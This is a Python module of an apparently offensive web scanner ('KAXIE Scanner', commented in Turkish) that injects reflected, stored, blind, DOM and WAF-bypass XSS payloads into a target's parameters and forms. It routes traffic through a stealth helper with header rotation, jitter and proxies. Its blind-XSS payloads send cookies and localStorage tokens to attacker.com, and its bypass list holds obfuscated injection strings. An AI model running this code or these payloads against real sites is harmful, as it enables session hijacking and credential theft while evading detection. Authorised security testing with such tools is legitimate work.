"""
KAXIE Scanner - XSS (Cross-Site Scripting) Tarama Modülü
"""

import requests
import re
from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from config import SCAN_CONFIG, Colors
from utils.stealth import StealthManager
from utils.payload_gen import PayloadGenerator


class XSSScanner:
    """XSS zafiyetlerini tespit eden sınıf."""

    def __init__(self, target, reporter, ai_engine=None, forms=None, links=None):
        self.target = target
        self.reporter = reporter
        self.ai_engine = ai_engine
        self.forms = forms or []
        self.links = links or []
        self.stealth = StealthManager()
        self.payload_gen = PayloadGenerator()
        self.session = requests.Session()
        self.session.verify = SCAN_CONFIG["verify_ssl"]
        self.vulnerable = []

    def run(self):
        """Tüm XSS testlerini çalıştırır."""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] XSS TARAMASI BAŞLADI{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] Hedef: {self.target}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

        self._test_reflected_xss()
        self._test_stored_xss()
        self._test_dom_xss()
        self._test_blind_xss()
        self._test_waf_bypass_xss()

        if self.ai_engine and self.ai_engine.selected_model and self.vulnerable:
            print(f"\n{Colors.MAGENTA}  [*] AI XSS analizi yapılıyor...{Colors.RESET}")
            for v in self.vulnerable:
                analysis = self.ai_engine.analyze_vulnerability(
                    vuln_type="XSS",
                    target=v["url"],
                    evidence=v["evidence"],
                    response_snippet=v.get("response", ""),
                )
                if analysis:
                    self.reporter.add_ai_analysis("XSS", analysis)

        return self.vulnerable

    def _make_request(self, url, method="GET", data=None, headers=None):
        """İstek yapar."""
        if headers is None:
            headers = self.stealth.get_headers(self.target)
        self.stealth.jitter_delay()

        try:
            if method.upper() == "GET":
                resp = self.session.get(url, headers=headers, timeout=SCAN_CONFIG["timeout"], verify=False, allow_redirects=True, proxies=self.stealth.get_proxy())
            else:
                resp = self.session.post(url, data=data, headers=headers, timeout=SCAN_CONFIG["timeout"], verify=False, allow_redirects=True, proxies=self.stealth.get_proxy())
            self.reporter.scan_stats["total_requests"] += 1
            return resp
        except Exception:
            return None

    def _check_xss_reflection(self, response_text, payload):
        """Payload'ın yansıma şeklini kontrol eder."""
        if payload in response_text:
            return "direct"

        html_encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
        if html_encoded in response_text:
            return "html_encoded"

        url_encoded = requests.utils.quote(payload, safe='')
        if url_encoded in response_text:
            return "url_encoded"

        context_patterns = [
            (r'<[^>]*' + re.escape(payload) + r'[^>]*>', "tag"),
            (r'javascript:[^"\']*' + re.escape(payload), "javascript"),
            (r'on\w+\s*=\s*["\'][^"\']*' + re.escape(payload), "event_handler"),
            (r'["\'][^"\']*' + re.escape(payload) + r'[^"\']*["\']', "attribute"),
        ]

        for pattern, context in context_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return context

        return None

    def _test_reflected_xss(self):
        """Reflected XSS testi."""
        print(f"\n  {Colors.BLUE}[*] Reflected XSS testi...{Colors.RESET}")

        xss_payloads = self.payload_gen.get_payloads("XSS")
        waf_variants = []
        for p in xss_payloads[:5]:
            waf_variants.extend(self.payload_gen.get_waf_bypass_variants(p, "XSS"))

        all_payloads = list(set(xss_payloads + waf_variants))

        test_urls = []
        parsed_base = urlparse(self.target)
        if parsed_base.query:
            test_urls.append(self.target)

        for link in self.links[:25]:
            parsed = urlparse(link)
            if parsed.query:
                test_urls.append(link)

        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload in all_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    resp = self._make_request(test_url)
                    if resp:
                        reflection = self._check_xss_reflection(resp.text, payload)
                        if reflection:
                            severity = "HIGH"
                            if reflection == "html_encoded":
                                severity = "LOW"
                            elif reflection == "url_encoded":
                                severity = "LOW"
                            elif reflection in ["tag", "event_handler", "javascript"]:
                                severity = "CRITICAL"

                            evidence = f"Param: {param_name}, Reflection: {reflection}, Payload: {payload[:50]}"
                            self.reporter.add_finding(
                                vuln_type="XSS",
                                severity=severity,
                                title=f"Reflected XSS ({param_name})",
                                description=f"Payload {reflection} context'te yansıdı.",
                                evidence=evidence,
                                url=test_url,
                            )
                            self.vulnerable.append({
                                "url": test_url,
                                "param": param_name,
                                "type": "reflected",
                                "payload": payload,
                                "context": reflection,
                                "evidence": evidence,
                                "response": resp.text[:200],
                            })
                            break

    def _test_stored_xss(self):
        """Stored XSS testi."""
        print(f"\n  {Colors.BLUE}[*] Stored XSS testi...{Colors.RESET}")

        stored_payloads = [
            "<script>alert('KAXIE-STORAGE-TEST')</script>",
            "<img src=x onerror=alert('KAXIE-STORAGE-TEST')>",
            "'><script>alert('KAXIE-STORAGE-TEST')</script>",
        ]

        for form in self.forms[:5]:
            action = form.get("action", self.target)
            method = form.get("method", "GET")
            inputs = form.get("inputs", [])

            text_inputs = [i for i in inputs if i.get("type", "text").lower() in ["text", "textarea", "search", ""]]

            for inp in text_inputs:
                param_name = inp.get("name", "")
                if not param_name:
                    continue

                for payload in stored_payloads:
                    data = {i.get("name", f"f_{j}"): "test" for j, i in enumerate(inputs) if i.get("name")}
                    data[param_name] = payload

                    resp = self._make_request(action, method=method, data=data)
                    if resp and resp.status_code in [200, 302]:
                        follow_url = resp.headers.get("Location", self.target)
                        if follow_url and not follow_url.startswith("http"):
                            follow_url = urljoin(self.target, follow_url)

                        check_resp = self._make_request(follow_url)
                        if check_resp and "KAXIE-STORAGE-TEST" in check_resp.text:
                            evidence = f"Stored XSS confirmed. Form: {action}, Field: {param_name}"
                            self.reporter.add_finding(
                                vuln_type="XSS",
                                severity="CRITICAL",
                                title=f"Stored XSS ({param_name})",
                                description="Payload kalıcı olarak saklandı ve geri döndürüldü.",
                                evidence=evidence,
                                url=action,
                            )
                            self.vulnerable.append({
                                "url": action,
                                "param": param_name,
                                "type": "stored",
                                "payload": payload,
                                "evidence": evidence,
                                "response": check_resp.text[:200],
                            })
                            break

    def _test_dom_xss(self):
        """DOM-based XSS testi."""
        print(f"\n  {Colors.BLUE}[*] DOM-based XSS testi...{Colors.RESET}")

        dom_sources = [
            "location.hash", "location.href", "location.search", "location.pathname",
            "document.URL", "document.documentURI", "document.baseURI",
            "document.cookie", "document.referrer", "window.name", "localStorage",
            "sessionStorage", "postMessage",
        ]

        dom_sinks = [
            "eval(", "Function(", "setTimeout(", "setInterval(",
            "document.write(", "document.writeln(", "innerHTML", "outerHTML",
            "insertAdjacentHTML(", "onevent", "location", "location.href",
        ]

        resp = self._make_request(self.target)
        if not resp:
            return

        js_code = ""
        script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)
        for script in script_pattern.findall(resp.text):
            js_code += script + "\n"

        for src in dom_sources:
            if src in js_code:
                for sink in dom_sinks:
                    if sink in js_code:
                        evidence = f"DOM Source: {src}, Sink: {sink}"
                        self.reporter.add_finding(
                            vuln_type="XSS",
                            severity="MEDIUM",
                            title="Potential DOM-based XSS",
                            description="JavaScript'te DOM kaynağı ve sink tespit edildi.",
                            evidence=evidence,
                            url=self.target,
                        )
                        self.vulnerable.append({
                            "url": self.target,
                            "param": "DOM",
                            "type": "dom",
                            "payload": f"Source:{src} Sink:{sink}",
                            "evidence": evidence,
                            "response": js_code[:300],
                        })
                        return

        print(f"    {Colors.DIM}[-] DOM XSS kaynağı/sink bulunamadı{Colors.RESET}")

    def _test_blind_xss(self):
        """Blind XSS testi."""
        print(f"\n  {Colors.BLUE}[*] Blind XSS testi...{Colors.RESET}")

        blind_payloads = [
            "<script>fetch('http://attacker.com/?c='+document.cookie)</script>",
            "<img src=x onerror=fetch('http://attacker.com/?c='+localStorage.getItem('token'))>",
            "<script>navigator.sendBeacon('http://attacker.com/',document.cookie)</script>",
        ]

        for form in self.forms[:3]:
            action = form.get("action", self.target)
            method = form.get("method", "GET")
            inputs = form.get("inputs", [])

            for inp in inputs:
                param_name = inp.get("name", "")
                if not param_name:
                    continue

                for payload in blind_payloads:
                    data = {i.get("name", f"f_{j}"): "test" for j, i in enumerate(inputs) if i.get("name")}
                    data[param_name] = payload

                    self._make_request(action, method=method, data=data)

        print(f"    {Colors.YELLOW}[!] Blind XSS payload'ları gönderildi (callback bekleniyor){Colors.RESET}")

    def _test_waf_bypass_xss(self):
        """WAF bypass XSS testi."""
        print(f"\n  {Colors.BLUE}[*] WAF bypass XSS testi...{Colors.RESET}")

        bypass_payloads = [
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            "<iframe srcdoc='<script>parent.alert(1)</script>'>",
            "<math><mtext></mtext><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">",
            "<a href=\"javascript&colon;alert(1)\">click</a>",
            "<details open ontoggle=alert(1)>",
            "<select><option><style><!--</style></option></select><img src=x onerror=alert(1)>",
            "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        ]

        parsed = urlparse(self.target)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)

        for param_name in params:
            for payload in bypass_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self._make_request(test_url)
                if resp:
                    reflection = self._check_xss_reflection(resp.text, payload)
                    if reflection and reflection not in ["html_encoded", "url_encoded"]:
                        evidence = f"WAF Bypass XSS. Param: {param_name}, Context: {reflection}"
                        self.reporter.add_finding(
                            vuln_type="XSS",
                            severity="CRITICAL",
                            title=f"WAF Bypass XSS ({param_name})",
                            description="WAF filtresi atlatılarak XSS payload'ı çalıştırılabilir.",
                            evidence=evidence,
                            url=test_url,
                        )
                        self.vulnerable.append({
                            "url": test_url,
                            "param": param_name,
                            "type": "waf-bypass",
                            "payload": payload,
                            "context": reflection,
                            "evidence": evidence,
                            "response": resp.text[:200],
                        })
                        break
